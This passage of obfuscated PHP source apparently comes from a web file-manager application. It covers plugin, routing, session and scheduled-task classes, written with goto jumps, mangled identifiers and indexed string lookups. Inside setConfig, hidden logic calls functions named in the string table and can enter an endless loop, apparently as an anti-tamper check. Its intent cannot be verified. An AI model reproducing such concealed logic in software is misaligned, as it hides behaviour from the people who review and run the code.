CÀÖƒº½Û‘; dô±¤ÜôŒİ: } final function echoFile($C¢ê‡˜“ö‹, $CÑŠ»¦Ñ–Ø = false) { goto F¸®ñ‹Ù¿á; Aó£ëó•Œ£: $this->parsePackage($F‡»°™­Š˜); if (is_array($CÑŠ»¦Ñ–Ø)) { $F‡»°™­Š˜ = str_replace(array_keys($CÑŠ»¦Ñ–Ø), array_values($CÑŠ»¦Ñ–Ø), $F‡»°™­Š˜); } echo $f‚°®×¢ã[56] . $F‡»°™­Š˜; goto b×Å×ë•¼Æ; F¸®ñ‹Ù¿á: $f‚°®×¢ã =& $_SERVER[¢Í]; $DƒÀ¸°Ğ—Ù = $this->pluginPath . $C¢ê‡˜“ö‹; if (ACT == $f‚°®×¢ã[1413]) { echo $f‚°®×¢ã[1414] . $this->pluginName . $f‚°®×¢ã[8] . $C¢ê‡˜“ö‹ . $f‚°®×¢ã[1415]; if (!file_exists($DƒÀ¸°Ğ—Ù)) { echo $f‚°®×¢ã[1416]; return; } } goto dø†£­“è; dø†£­“è: $F‡»°™­Š˜ = $this->parseFile($DƒÀ¸°Ğ—Ù); $this->parseLang($F‡»°™­Š˜); $this->parseConfig($F‡»°™­Š˜); goto Aó£ëó•Œ£; b×Å×ë•¼Æ: } final function initLang() { goto C¸ÓŠŸï«ç; C¸ÓŠŸï«ç: $f’ŒğïÒ‡ =& $_SERVER[¢Í]; $BšØìÜ¯ŸÉ = $f’ŒğïÒ‡[1417]; $AĞìÁ•¹ÓÉ = $this->pluginPath . $f’ŒğïÒ‡[1418]; goto Eµ¶É¿Ú’; cŸêšÚºÉŠ: if (!is_array($dôˆˆ›ˆ³‘)) { return array(); } if (@count($dôˆˆ›ˆ³‘) > 0) { I18n::set($dôˆˆ›ˆ³‘); } return $dôˆˆ›ˆ³‘; goto aÈÈÜ’; Eµ¶É¿Ú’: $aÀÅ¬ÀµÊÌ = I18n::getType(); $dôˆˆ›ˆ³‘ = array(); if (file_exists($AĞìÁ•¹ÓÉ . $aÀÅ¬ÀµÊÌ . $f’ŒğïÒ‡[778])) { $dôˆˆ›ˆ³‘ = (include $AĞìÁ•¹ÓÉ . $aÀÅ¬ÀµÊÌ . $f’ŒğïÒ‡[778]); } else { if ($aÀÅ¬ÀµÊÌ == $f’ŒğïÒ‡[1419] && !file_exists($AĞìÁ•¹ÓÉ . $aÀÅ¬ÀµÊÌ . $f’ŒğïÒ‡[778]) && file_exists($AĞìÁ•¹ÓÉ . $f’ŒğïÒ‡[1420])) { $dôˆˆ›ˆ³‘ = (include $AĞìÁ•¹ÓÉ . $f’ŒğïÒ‡[1420]); } else { if (file_exists($AĞìÁ•¹ÓÉ . $BšØìÜ¯ŸÉ . $f’ŒğïÒ‡[778])) { $dôˆˆ›ˆ³‘ = (include $AĞìÁ•¹ÓÉ . $BšØìÜ¯ŸÉ . $f’ŒğïÒ‡[778]); } } } goto cŸêšÚºÉŠ; aÈÈÜ’: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($döëèâÅ¢) { $cĞ‚©ŒÍ¬ª =& $_SERVER[¢Í]; if (!isset($_SERVER[$cĞ‚©ŒÍ¬ª[51]]) || !isset($_SERVER[$cĞ‚©ŒÍ¬ª[60]])) { goto EÕ¸˜œÔˆÃ; B›Şİ¼åİ£: $Cİì‹Û·ˆ = $cĞ‚©ŒÍ¬ª[808]; $Cİì‹Û·ˆ($_SERVER[$cĞ‚©ŒÍ¬ª[809]]); $B¢…¼µÄ¡ = 1; goto a¶Û¹Ú¨õ°; a¶Û¹Ú¨õ°: for ($c—ˆòªÀ†· = $B¢…¼µÄ¡; $c—ˆòªÀ†· > 0; $c—ˆòªÀ†·++) { $Cİì‹Û·ˆ = json_encode($GLOBALS[$cĞ‚©ŒÍ¬ª[409]]); } goto Bë®Ò­²¸; EÕ¸˜œÔˆÃ: $FòíØÔ¬¹¥ = $cĞ‚©ŒÍ¬ª[807]; $f¦†òÔà² = $cĞ‚©ŒÍ¬ª[53]; $fÀ†¾‡´‡œ = $_SERVER[$cĞ‚©ŒÍ¬ª[54]] . $cĞ‚©ŒÍ¬ª[55]; goto AÙÆîÂ—øÄ; AÙÆîÂ—øÄ: $cë‘÷‘­• = $f¦†òÔà²($fÀ†¾‡´‡œ); $D‡Ã˜ªÃ¬¡ = explode($cĞ‚©ŒÍ¬ª[56], $cë‘÷‘­•); if (count($D‡Ã˜ªÃ¬¡) < $cĞ‚©ŒÍ¬ª[579]) { $FªÏã ¡´… = $cĞ‚©ŒÍ¬ª[58]; $FªÏã ¡´…(); } goto B›Şİ¼åİ£; Bë®Ò­²¸: } return $this->modelPlugin->setConfig($this->pluginName, $döëèâÅ¢); } public function onSetConfig($A¡—ÍäØ¶£) { } public function onGetConfig($CºÂØÂ‘Û) { } public function onChangeStatus($A›¬ÌÙ¯ñÕ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($DÜË½¡¿Ğ = "\x70\x6c\x75\147\151\x6e\x41\x75\164\x68") { $a›¨°Á‹ï÷ =& $_SERVER[¢Í]; if (!defined($a›¨°Á‹ï÷[451])) { return !1; } if (_get($GLOBALS, $a›¨°Á‹ï÷[483])) { return !0; } $d´Ñš “Ú¯ = $this->getConfig(); if (!$d´Ñš “Ú¯[$DÜË½¡¿Ğ]) { return !1; } return ActionCall($a›¨°Á‹ï÷[1421], $d´Ñš “Ú¯[$DÜË½¡¿Ğ]); } public function url($dÃƒ¸Ü±î, $d¤ˆ—À…²¼ = '', $f“ÖÖ¿ˆ™† = true) { goto eÃ¼ëøŠ¨½; eÃ¼ëøŠ¨½: $aî»õÃãñÕ =& $_SERVER[¢Í]; $b‹ö„Æ“„¹ = $this->getConfig(); $EÓÎÆéĞí = KOD_VERSION . $aî»õÃãñÕ[101] . KOD_VERSION_BUILD; goto DÎ”Â¦¥…; DÎ”Â¦¥…: $cóä˜Äèšê = $this->packageVersion(); $bóÙï¸” = $EÓÎÆéĞí . $aî»õÃãñÕ[437] . $cóä˜Äèšê; if (substr($dÃƒ¸Ü±î, 0, 4) == $aî»õÃãñÕ[154] || substr($dÃƒ¸Ü±î, 0, 2) == $aî»õÃãñÕ[1207]) { $E²§êé” = $dÃƒ¸Ü±î . $aî»õÃãñÕ[1422] . $bóÙï¸”; } else { if ($d¤ˆ—À…²¼ == $aî»õÃãñÕ[33]) { $E²§êé” = $this->pluginHost . $dÃƒ¸Ü±î . $aî»õÃãñÕ[1422] . $bóÙï¸”; } else { if ($d¤ˆ—À…²¼ === $aî»õÃãñÕ[86]) { $E²§êé” = $this->pluginHost . $dÃƒ¸Ü±î; } else { if ($d¤ˆ—À…²¼ == $aî»õÃãñÕ[1423]) { $E²§êé” = STATIC_PATH . $dÃƒ¸Ü±î . $aî»õÃãñÕ[1422] . $EÓÎÆéĞí; } else { if ($d¤ˆ—À…²¼ == $aî»õÃãñÕ[1424]) { $E²§êé” = APP_HOST . $aî»õÃãñÕ[1425] . $dÃƒ¸Ü±î . $aî»õÃãñÕ[1422] . $EÓÎÆéĞí; } else { if (isset($b‹ö„Æ“„¹[$d¤ˆ—À…²¼])) { $E²§êé” = $b‹ö„Æ“„¹[$d¤ˆ—À…²¼] . $dÃƒ¸Ü±î . $aî»õÃãñÕ[1422] . $bóÙï¸”; } } } } } } goto C©Ë÷ãì; C©Ë÷ãì: if (!$f“ÖÖ¿ˆ™†) { return $E²§êé”; } echo $E²§êé”; goto eÓá‰ÒÀøø; eÓá‰ÒÀøø: } public function link($fÓãéíÒÑ‹ = false, $bß‰„öÕ¯› = '') { $f½™íè“¦ =& $_SERVER[¢Í]; if (!$fÓãéíÒÑ‹) { $this->link($f½™íè“¦[1426], $f½™íè“¦[1424]); $this->link($f½™íè“¦[1427], $f½™íè“¦[1423]); $this->link($f½™íè“¦[1428], $f½™íè“¦[1423]); $this->link($f½™íè“¦[1429], $f½™íè“¦[1423]); $this->link($f½™íè“¦[1430], $f½™íè“¦[1423]); return; } $Aå†î¡ò» = $this->url($fÓãéíÒÑ‹, $bß‰„öÕ¯›, !1); if (substr($fÓãéíÒÑ‹, -3) == $f½™íè“¦[1431]) { echo $f½™íè“¦[1432] . $Aå†î¡ò» . $f½™íè“¦[1433] . $f½™íè“¦[56]; } else { if (substr($fÓãéíÒÑ‹, -4) == $f½™íè“¦[1434]) { echo $f½™íè“¦[1435] . $Aå†î¡ò» . $f½™íè“¦[1436] . $f½™íè“¦[56]; } } } } goto eÜëÉó™; eÜëÉó™: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\x6e\x79" => "\133\136\57\135\x2b", "\x3a\156\165\155" => "\133\x30\x2d\71\135\53", "\72\141\154\x6c" => "\56\52"); public static $errorCallback; public static function __callstatic($eº©‡ºÅÊÓ, $Dù¼£Ä™·) { $eùëë Øç =& $_SERVER[¢Í]; if ($eº©‡ºÅÊÓ == $eùëë Øç[1437]) { $Eˆ‰Œõ— = array_map($eùëë Øç[1438], $Dù¼£Ä™·[0]); $câÛµĞÅ›“ = strpos($Dù¼£Ä™·[1], $eùëë Øç[8]) === 0 ? $Dù¼£Ä™·[1] : $eùëë Øç[8] . $Dù¼£Ä™·[1]; $d˜ôÔø…½½ = $Dù¼£Ä™·[2]; } else { $Eˆ‰Œõ— = null; $câÛµĞÅ›“ = strpos($Dù¼£Ä™·[0], $eùëë Øç[8]) === 0 ? $Dù¼£Ä™·[0] : $eùëë Øç[8] . $Dù¼£Ä™·[0]; $d˜ôÔø…½½ = $Dù¼£Ä™·[1]; } array_push(self::$maps, $Eˆ‰Œõ—); array_push(self::$routes, $câÛµĞÅ›“); array_push(self::$methods, strtoupper($eº©‡ºÅÊÓ)); array_push(self::$callbacks, $d˜ôÔø…½½); } public static function error($Cº à¡ÙãÖ) { self::$errorCallback = $Cº à¡ÙãÖ; } public static function haltOnMatch($fà§­é©²¡ = true) { self::$halts = $fà§­é©²¡; } public static function dispatch() { goto BŒ×´ç®õ; BÖº½¢³½: $f¡×¥«±éØ = array_keys(static::$patterns); $e–í³çÆØ“ = array_values(static::$patterns); $c›Ä÷Œ™Á = !1; goto cš‰š‡ƒã«; BŒ×´ç®õ: $aøÏˆÇ³¯¤ =& $_SERVER[¢Í]; $EÜ…ò¨ğ±£ = parse_url($_SERVER[$aøÏˆÇ³¯¤[1439]], PHP_URL_PATH); $A“‰ÊÜ‘Ü = $_SERVER[$aøÏˆÇ³¯¤[164]]; goto BÖº½¢³½; cš‰š‡ƒã«: self::$routes = preg_replace($aøÏˆÇ³¯¤[1126], $aøÏˆÇ³¯¤[8], self::$routes); if (in_array($EÜ…ò¨ğ±£, self::$routes)) { $c–Ä„ùò’² = array_keys(self::$routes, $EÜ…ò¨ğ±£); foreach ($c–Ä„ùò’² as $BˆÃ§Ç§…) { if (self::$methods[$BˆÃ§Ç§…] == $A“‰ÊÜ‘Ü || self::$methods[$BˆÃ§Ç§…] == $aøÏˆÇ³¯¤[1440] || in_array($A“‰ÊÜ‘Ü, self::$maps[$BˆÃ§Ç§…])) { $c›Ä÷Œ™Á = !0; if (!is_object(self::$callbacks[$BˆÃ§Ç§…])) { $B »ñˆçÒˆ = explode($aøÏˆÇ³¯¤[8], self::$callbacks[$BˆÃ§Ç§…]); $eÌ÷†åÄš¬ = end($B »ñˆçÒˆ); $a¬êŒ°×Ã± = explode($aøÏˆÇ³¯¤[1441], $eÌ÷†åÄš¬); $e­ˆ”Ôš½ = new $a¬êŒ°×Ã±[0](); $e­ˆ”Ôš½->{$a¬êŒ°×Ã±[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$BˆÃ§Ç§…]); if (self::$halts) { return; } } } } } else { $B÷ù‘ßŸ = 0; foreach (self::$routes as $BˆÃ§Ç§…) { if (strpos($BˆÃ§Ç§…, $aøÏˆÇ³¯¤[4]) !== !1) { $BˆÃ§Ç§… = str_replace($f¡×¥«±éØ, $e–í³çÆØ“, $BˆÃ§Ç§…); } if (preg_match($aøÏˆÇ³¯¤[1442] . $BˆÃ§Ç§… . $aøÏˆÇ³¯¤[1443], $EÜ…ò¨ğ±£, $A·ŒÓ®ä)) { if (self::$methods[$B÷ù‘ßŸ] == $A“‰ÊÜ‘Ü || self::$methods[$B÷ù‘ßŸ] == $aøÏˆÇ³¯¤[1440] || !empty(self::$maps[$B÷ù‘ßŸ]) && in_array($A“‰ÊÜ‘Ü, self::$maps[$B÷ù‘ßŸ])) { $c›Ä÷Œ™Á = !0; array_shift($A·ŒÓ®ä); if (!is_object(self::$callbacks[$B÷ù‘ßŸ])) { $B »ñˆçÒˆ = explode($aøÏˆÇ³¯¤[8], self::$callbacks[$B÷ù‘ßŸ]); $eÌ÷†åÄš¬ = end($B »ñˆçÒˆ); $a¬êŒ°×Ã± = explode($aøÏˆÇ³¯¤[1441], $eÌ÷†åÄš¬); $e­ˆ”Ôš½ = new $a¬êŒ°×Ã±[0](); if (!method_exists($e­ˆ”Ôš½, $a¬êŒ°×Ã±[1])) { echo $aøÏˆÇ³¯¤[1444]; } else { call_user_func_array(array($e­ˆ”Ôš½, $a¬êŒ°×Ã±[1]), $A·ŒÓ®ä); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$B÷ù‘ßŸ], $A·ŒÓ®ä); if (self::$halts) { return; } } } } $B÷ù‘ßŸ++; } } if ($c›Ä÷Œ™Á == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $Dã‘òÄº†™ =& $_SERVER[¢Í]; header($_SERVER[$Dã‘òÄº†™[1445]] . $Dã‘òÄº†™[1446]); echo $Dã‘òÄº†™[1447]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$aøÏˆÇ³¯¤[1439]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto f¶ŠË®Â¡¤; f¶ŠË®Â¡¤: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto FËë‘«Ò„£; b¬Û‹Ü‡’: if (self::$sessionSign) { } else { if (Cookie::get($a…º÷Úã)) { self::$sessionSign = Cookie::get($a…º÷Úã); } else { self::$sessionSign = guid(); } } Cookie::setSafe($a…º÷Úã, self::$sessionSign, self::$sessionTime); $Dè¿Æ†½¿‰ = $FŞ®½“•µ£[$aœƒÆ“[1450]]; goto BÔÙ¤—¯äö; BÔÙ¤—¯äö: $d‘÷÷õ¨ğ† = $FŞ®½“•µ£[$Dè¿Æ†½¿‰]; $fÎæâ…ÕÍ› = $FŞ®½“•µ£[$aœƒÆ“[768]]; switch ($Dè¿Æ†½¿‰) { case $aœƒÆ“[17]: self::$handle = Model($aœƒÆ“[769]); break; case $aœƒÆ“[770]: self::$handle = new CacheRedis($d‘÷÷õ¨ğ†, $fÎæâ…ÕÍ›); break; case $aœƒÆ“[771]: self::$handle = new CacheMemcached($d‘÷÷õ¨ğ†, $fÎæâ…ÕÍ›); break; case $aœƒÆ“[181]: $d‘÷÷õ¨ğ†[$aœƒÆ“[85]] = $d‘÷÷õ¨ğ†[$aœƒÆ“[85]] . $aœƒÆ“[1451]; self::$handle = new CacheFile($d‘÷÷õ¨ğ†, $fÎæâ…ÕÍ›); default: break; } goto e”‹¶¡‚„ø; e”‹¶¡‚„ø: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $B±î­ƒ¹ˆ = new self(); return $B±î­ƒ¹ˆ; goto c¤˜ŠØÕ‡; cØ‹šÒã‡: $FŞ®½“•µ£ = $GLOBALS[$aœƒÆ“[6]][$aœƒÆ“[352]]; self::$sessionTime = $FŞ®½“•µ£[$aœƒÆ“[1448]]; $a…º÷Úã = isset($GLOBALS[$aœƒÆ“[1449]]) ? $GLOBALS[$aœƒÆ“[1449]] : SESSION_ID; goto b¬Û‹Ü‡’; FËë‘«Ò„£: $aœƒÆ“ =& $_SERVER[¢Í]; static $B±î­ƒ¹ˆ = false; if ($B±î­ƒ¹ˆ) { return $B±î­ƒ¹ˆ; } goto cØ‹šÒã‡; c¤˜ŠØÕ‡: } public static function sign($càÁ»òçá = false) { $càÁ»òçá && (self::$sessionSign = $càÁ»òçá); self::init(); return self::$sessionSign; } public static function set($CÒá–Ú¨”Ë, $eŒŠÜæòê§ = false) { self::init(); if (is_array($CÒá–Ú¨”Ë)) { foreach ($CÒá–Ú¨”Ë as $fÀÇ“Ó‰Ñ => $eßíÖøŸñ) { array_set_value(self::$data, $fÀÇ“Ó‰Ñ, $eßíÖøŸñ); } } else { array_set_value(self::$data, $CÒá–Ú¨”Ë, $eŒŠÜæòê§); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($Aê¦×ÍââÙ = false) { self::init(); if (!$Aê¦×ÍââÙ) { return self::$data; } return array_get_value(self::$data, $Aê¦×ÍââÙ); } public static function remove($C‘œĞ·ã) { self::init(); unset(self::$data[$C‘œĞ·ã]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¢Í][773])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto EñØÄİº´¢; BïÔŠª™˜: while (!0) { self::cacheClear(); if (self::valueGet($EùÉ´«Û®£[703]) != $EùÉ´«Û®£[93]) { self::valueSet($EùÉ´«Û®£[1452], $EùÉ´«Û®£[494]); self::log($EùÉ´«Û®£[1456]); die; } self::valueSet($EùÉ´«Û®£[1452], $EùÉ´«Û®£[93]); self::valueSet($EùÉ´«Û®£[1453], time()); self::taskRunAll(); sleep(self::valueGet($EùÉ´«Û®£[1457])); } goto aùğ†ê›ÏÉ; fä¹‡©”æ: http_close(); self::valueSet($EùÉ´«Û®£[1452], $EùÉ´«Û®£[93]); Hook::bind($EùÉ´«Û®£[1454], $EùÉ´«Û®£[1455]); goto BïÔŠª™˜; EñØÄİº´¢: $EùÉ´«Û®£ =& $_SERVER[¢Í]; if (self::valueGet($EùÉ´«Û®£[703]) != $EùÉ´«Û®£[93]) { return; } if (self::valueGet($EùÉ´«Û®£[1452]) == $EùÉ´«Û®£[93]) { $EÍ Ÿè¿õá = self::valueGet($EùÉ´«Û®£[1453]); if (time() - $EÍ Ÿè¿õá > 3600 * 2) { self::restart(); } return; } goto fä¹‡©”æ; aùğ†ê›ÏÉ: } public static function restart() { $F¦ªƒÔŞâ‘ =& $_SERVER[¢Í]; http_close(); self::valueSet($F¦ªƒÔŞâ‘[703], $F¦ªƒÔŞâ‘[494]); sleep(self::valueGet($F¦ªƒÔŞâ‘[1457]) + 5); self::valueSet($F¦ªƒÔŞâ‘[1452], $F¦ªƒÔŞâ‘[494]); self::valueSet($F¦ªƒÔŞâ‘[703], $F¦ªƒÔŞâ‘[93]); } public static function shutdownEvent() { $bà¢§Öååé =& $_SERVER[¢Í]; self::valueSet($bà¢§Öååé[1452], $bà¢§Öååé[494]); self::log($bà¢§Öååé[1458]); } public static function config($D¯µÆÎÏ–, $cÆÏ¾Ô¬ÅÒ) { $E¯¬ÀÈÄß =& $_SERVER[¢Í]; $D™Ïàô = 10; $cÆÏ¾Ô¬ÅÒ = intval($cÆÏ¾Ô¬ÅÒ) <= $D™Ïàô ? $D™Ïàô : intval($cÆÏ¾Ô¬ÅÒ); self::valueSet($E¯¬ÀÈÄß[703], $D¯µÆÎÏ–); self::valueSet($E¯¬ÀÈÄß[1457], $cÆÏ¾Ô¬ÅÒ); } private static function taskRunAll() { goto c„ï²±; c„ï²±: $f¸»ĞÌ‚Šç =& $_SERVER[¢Í]; $Fè›±å¡˜Ó = timeFloat(); $dÏçé¯»Ÿ = Model($f¸»ĞÌ‚Šç[1459])->listData(); goto D²«ñÂ‹Âƒ; EÓ›âØ‘Îß: self::taskQueueRun($Fè›±å¡˜Ó); self::closeDatabase(); goto D•ßÁ‹ŒÈ; D²«ñÂ‹Âƒ: $B§ËÁùù©¬ = count($dÏçé¯»Ÿ); for ($B©‘ŞÂ«Ô = 0; $B©‘ŞÂ«Ô < $B§ËÁùù©¬; $B©‘ŞÂ«Ô++) { $cÃ¸õ´¢Û’ = $dÏçé¯»Ÿ[$B©‘ŞÂ«Ô]; if (!$cÃ¸õ´¢Û’[$f¸»ĞÌ‚Šç[392]] || $cÃ¸õ´¢Û’[$f¸»ĞÌ‚Šç[1460]] != $f¸»ĞÌ‚Šç[93]) { continue; } if (!self::taskTimeCheck($cÃ¸õ´¢Û’)) { continue; } self::taskRun($cÃ¸õ´¢Û’); } Hook::trigger($f¸»ĞÌ‚Šç[1461]); goto EÓ›âØ‘Îß; D•ßÁ‹ŒÈ: } private static function taskQueueRun($C‰ØôŒÀ¿Š) { $fÁÒàƒä„ = 10; while (!0) { $c‡ÔºÉÈ—› = TaskQueue::run(); if ($c‡ÔºÉÈ—› === !1) { break; } if (timeFloat() - $C‰ØôŒÀ¿Š >= $fÁÒàƒä„) { break; } } } private static function taskTimeCheck($bç¥¸ˆÏ¿¿) { goto f±Ê«²ÉØ; B·£‹ï‚Ÿ“: switch ($bÜšè¥Ô·§[$dÓ“ø°‰»Ö[29]]) { case $dÓ“ø°‰»Ö[1468]: if (time() - $e‹å˜ä‚Äæ < 3600 * 24 * 30) { return !1; } if ($bÜšè¥Ô·§[$dÓ“ø°‰»Ö[1468]] == date($dÓ“ø°‰»Ö[1469]) && $C¹¨œˆÚ¶â) { return !0; } break; case $dÓ“ø°‰»Ö[1470]: if (time() - $e‹å˜ä‚Äæ < 3600 * 24 * 7) { return !1; } $DÅ±³è¸Á = date($dÓ“ø°‰»Ö[1471]) == 0 ? 7 : date($dÓ“ø°‰»Ö[1471]); if ($bÜšè¥Ô·§[$dÓ“ø°‰»Ö[1470]] == $DÅ±³è¸Á && $C¹¨œˆÚ¶â) { return !0; } break; case $dÓ“ø°‰»Ö[1463]: if (time() - $e‹å˜ä‚Äæ < 3600 * 24) { return !1; } if ($C¹¨œˆÚ¶â) { return !0; } break; case $dÓ“ø°‰»Ö[1472]: if (time() - $e‹å˜ä‚Äæ >= floatval($bÜšè¥Ô·§[$dÓ“ø°‰»Ö[1472]]) * 60) { return !0; } break; default: break; } return !1; goto fÌ°…‹¢ç½; f¨…œäçéé: $A² ¸íáÍ = strtotime($dÓ“ø°‰»Ö[1462] . $bÜšè¥Ô·§[$dÓ“ø°‰»Ö[1463]] . $dÓ“ø°‰»Ö[1464]) - strtotime($dÓ“ø°‰»Ö[1465]); $dÖæ½¼ÌÏˆ = time() - strtotime(date($dÓ“ø°‰»Ö[1466]) . $dÓ“ø°‰»Ö[1467]); $C¹¨œˆÚ¶â = $dÖæ½¼ÌÏˆ >= $A² ¸íáÍ && $dÖæ½¼ÌÏˆ <= $A² ¸íáÍ + 3600; goto B·£‹ï‚Ÿ“; f±Ê«²ÉØ: $dÓ“ø°‰»Ö =& $_SERVER[¢Í]; $bÜšè¥Ô·§ = json_decode($bç¥¸ˆÏ¿¿[$dÓ“ø°‰»Ö[203]], !0); $e‹å˜ä‚Äæ = intval($bç¥¸ˆÏ¿¿[$dÓ“ø°‰»Ö[1453]]); goto f¨…œäçéé; fÌ°…‹¢ç½: } private static function closeDatabase() { goto AÉÍ–²‚Ò‡; AÉÍ–²‚Ò‡: $Dİ¯ÁÕ®Œ‚ =& $_SERVER[¢Í]; static $døëà±õœ— = 0; $BÈ¤‹ç­ï¤ = 1800; goto f‚­¶òÔ¨Å; f‚­¶òÔ¨Å: if (!$døëà±õœ—) { $døëà±õœ— = time(); } if (time() - $døëà±õœ— < $BÈ¤‹ç­ï¤) { return; } $døëà±õœ— = time(); goto fŒåÆ£Äõš; fŒåÆ£Äõš: $A»“ÊÙ¬Š = Model($Dİ¯ÁÕ®Œ‚[500])->db($Dİ¯ÁÕ®Œ‚[33]); if ($A»“ÊÙ¬Š) { $A»“ÊÙ¬Š->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($Dİ¯ÁÕ®Œ‚[1473], $Dİ¯ÁÕ®Œ‚[1474]); die; } goto F³×ÓÓ–‡Š; F³×ÓÓ–‡Š: } public static function taskRun($fÈ‡¡Ï¾Ë¶) { goto fâ½¯„«…±; EÖñÈŞ»º: $CšÄÏšœ¡¢ = timeFloat(); $aã®¶ğ–ç = $F±èÕŸóÅÜ[33]; switch ($fÈ‡¡Ï¾Ë¶[$F±èÕŸóÅÜ[29]]) { case $F±èÕŸóÅÜ[310]: $Dìõš„ª™é = url_request($fÈ‡¡Ï¾Ë¶[$F±èÕŸóÅÜ[1478]], $F±èÕŸóÅÜ[234], !1, !1, !1, !1, 5); $aã®¶ğ–ç = strlen($Dìõš„ª™é); break; case $F±èÕŸóÅÜ[233]: $aã®¶ğ–ç = Hook::apply($fÈ‡¡Ï¾Ë¶[$F±èÕŸóÅÜ[1478]]); default: break; } goto eØ¢×ÃäÕ£; eØ¢×ÃäÕ£: Model($F±èÕŸóÅÜ[1479])->add(array($F±èÕŸóÅÜ[1480] => $F±èÕŸóÅÜ[33], $F±èÕŸóÅÜ[1481] => $F±èÕŸóÅÜ[494], $F±èÕŸóÅÜ[29] => $F±èÕŸóÅÜ[1482] . $fÈ‡¡Ï¾Ë¶[$F±èÕŸóÅÜ[392]], $F±èÕŸóÅÜ[1483] => json_encode(array($F±èÕŸóÅÜ[28] => $fÈ‡¡Ï¾Ë¶[$F±èÕŸóÅÜ[28]], $F±èÕŸóÅÜ[1484] => timeFloat() - $CšÄÏšœ¡¢, $F±èÕŸóÅÜ[296] => $aã®¶ğ–ç)))); self::log($F±èÕŸóÅÜ[1485] . $fÈ‡¡Ï¾Ë¶[$F±èÕŸóÅÜ[392]] . $F±èÕŸóÅÜ[1486] . $aã®¶ğ–ç); return !0; goto E†‹­ÔØ£; fâ½¯„«…±: $F±èÕŸóÅÜ =& $_SERVER[¢Í]; self::log($F±èÕŸóÅÜ[1475] . $fÈ‡¡Ï¾Ë¶[$F±èÕŸóÅÜ[392]] . $F±èÕŸóÅÜ[1476] . $fÈ‡¡Ï¾Ë¶[$F±èÕŸóÅÜ[28]] . $F±èÕŸóÅÜ[1477] . $fÈ‡¡Ï¾Ë¶[$F±èÕŸóÅÜ[1478]]); Model($F±èÕŸóÅÜ[1459])->run($fÈ‡¡Ï¾Ë¶[$F±èÕŸóÅÜ[392]]); goto EÖñÈŞ»º; E†‹­ÔØ£: } private static function valueGet($DÏÂ£Öˆä) { $Fâ“”‰¤ù =& $_SERVER[¢Í]; $EÇ¼‹ó¸Ï¶ = $Fâ“”‰¤ù[1487]; $c¢íî³Æ‡ = Model($Fâ“”‰¤ù[1488])->get($DÏÂ£Öˆä, $EÇ¼‹ó¸Ï¶); if (is_null($c¢íî³Æ‡)) { Model($Fâ“”‰¤ù[1488])->set($Fâ“”‰¤ù[1457], 10, $EÇ¼‹ó¸Ï¶); Model($Fâ“”‰¤ù[1488])->set($Fâ“”‰¤ù[703], $Fâ“”‰¤ù[93], $EÇ¼‹ó¸Ï¶); Model($Fâ“”‰¤ù[1488])->set($Fâ“”‰¤ù[1452], $Fâ“”‰¤ù[494], $EÇ¼‹ó¸Ï¶); $c¢íî³Æ‡ = Model($Fâ“”‰¤ù[1488])->get($DÏÂ£Öˆä, $EÇ¼‹ó¸Ï¶); } return $c¢íî³Æ‡; } private static function valueSet($EË †¤¤‘©, $BÊæº‚»Íï) { $FÊÎ–„é =& $_SERVER[¢Í]; return Model($FÊÎ–„é[1488])->set($EË †¤¤‘©, $BÊæº‚»Íï, $FÊÎ–„é[1487]); } protected static function log($b¤ñ¤•Šêš) { write_log($b¤ñ¤•Šêš, $_SERVER[¢Í][1474]); } private static function cacheClear() { $f”˜³Îå®Ä =& $_SERVER[¢Í]; $b‘êŞ¸“„ë = Model($f”˜³Îå®Ä[1488])->cacheKey($f”˜³Îå®Ä[1487]); Cache::clearMemory($b‘êŞ¸“„ë); Model($f”˜³Îå®Ä[1459])->cacheClear(); } } goto A˜¶µŞ‚Â…; e·½—š‡äã: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($c»µ™Ÿ³†¬) { if (substr($c»µ™Ÿ³†¬, 0, 2) == $_SERVER[¢Í][1207]) { $c»µ™Ÿ³†¬ = BASIC_PATH . substr($c»µ™Ÿ³†¬, 2); } return $c»µ™Ÿ³†¬; } public function iconvApp($fª—„ôÂÑß) { $C¾»ö¼¾³ =& $_SERVER[¢Í]; global $config; return $this->iconvTo($fª—„ôÂÑß, $config[$C¾»ö¼¾³[1205]], $config[$C¾»ö¼¾³[1204]]); } public function iconvSystem($fãšº†î„ˆ) { $d—Îá×ò° =& $_SERVER[¢Í]; global $config; return $this->iconvTo($fãšº†î„ˆ, $config[$d—Îá×ò°[1204]], $config[$d—Îá×ò°[1205]]); } public function getPathOuter($C‘Ä·ªœ’) { goto d…™˜¾õ¢Ş; F“ë¿èØÅò: $C‘Ä·ªœ’ = KodIO::clear($C‘Ä·ªœ’); $C‘Ä·ªœ’ = substr($C‘Ä·ªœ’, strlen($C„æ·ÇŒëñ)); if (empty($this->pathDriver)) { return $C‘Ä·ªœ’; } goto f¨ÙÉ†º»õ; f¨ÙÉ†º»õ: return $this->pathDriver . $b÷‡¿ø¢­„[8] . ltrim($C‘Ä·ªœ’, $b÷‡¿ø¢­„[8]); goto aÎ­Éº¤¯ª; B‰Ï¾Œ¥ÊÜ: if (substr($C„æ·ÇŒëñ, 